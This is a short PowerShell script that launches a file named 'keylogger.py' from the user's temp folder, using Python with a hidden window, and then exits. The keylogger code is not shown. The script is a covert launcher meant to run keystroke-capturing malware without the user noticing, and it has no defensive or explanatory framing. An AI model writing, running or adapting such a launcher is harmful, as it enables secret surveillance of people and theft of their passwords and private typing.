# Define Temp directory
$tempDir = $env:TEMP
$Path = "$tempDir\keylogger.py"

# Start Python in the background without a window
Start-Process "python" -ArgumentList "`"$Path`"" -WindowStyle Hidden

# Exit PowerShell
exit